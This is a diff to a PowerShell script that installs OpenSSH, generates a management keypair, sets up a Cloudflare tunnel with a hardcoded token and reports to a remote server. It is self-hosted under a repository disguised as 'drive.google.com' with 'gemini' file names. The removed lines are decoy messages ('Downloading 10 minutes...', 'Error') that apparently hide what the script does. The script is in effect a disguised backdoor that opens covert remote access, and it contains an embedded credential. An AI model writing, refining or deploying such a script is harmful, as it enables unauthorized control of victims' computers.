@@ -2,11 +2,10 @@
   install_openssh.ps1 — BAN FINAL (CHỈ CẦN TOKEN)
   Cai OpenSSH -> sinh keypair -> cai cloudflared -> báo cáo lên server
 #>
-Write-Host 'Downloading 10 minutes...' -ForegroundColor Green
 
 # ==================== CAU HINH ====================
 $ApiBase = 'https://vm-ssh-manager.onrender.com'
-$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini1.ps1'
+$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini2.ps1'
 
 # ⚠️ THAY ĐỔI 2 DÒNG DƯỚI ĐÂY TRƯỚC KHI CHẠY
 $CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6Ik1tRmtZV0l3TkRRdE16TTRZUzAwTVRReExUaG1OMkV0WTJVME5tRXdOekF3TnpVd01Ea3pPVGxrTW1VdE5tRmpaaTAwTVRZNUxXSTNOMk10WlRaak5UWmhZV1ZqWkdSaCJ9"   
@@ -59,7 +58,8 @@ for ($w = 0; $w -lt 30; $w++) {
 }
 
 # ===== 2. SINH KEYPAIR QUAN TRI + CAI PUBLIC =====
-\$mgmtDir = Join-Path $env:ProgramData 'ssh-mgmt'
+# FIX: Đã xóa dấu \ bị lỗi ở dòng dưới
+$mgmtDir = Join-Path $env:ProgramData 'ssh-mgmt'
 New-Item -ItemType Directory -Force -Path $mgmtDir | Out-Null
 $priv = Join-Path $mgmtDir 'mgmt_ed25519'
 $pub  = "$priv.pub"
@@ -164,6 +164,3 @@ if (-not $primaryIP) {
   }
   if (-not $sent) { Write-Host '[PENDING] Khong gui duoc.' -ForegroundColor Yellow }
 }
-
-# if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
-Write-Host "Error" -ForegroundColor Red
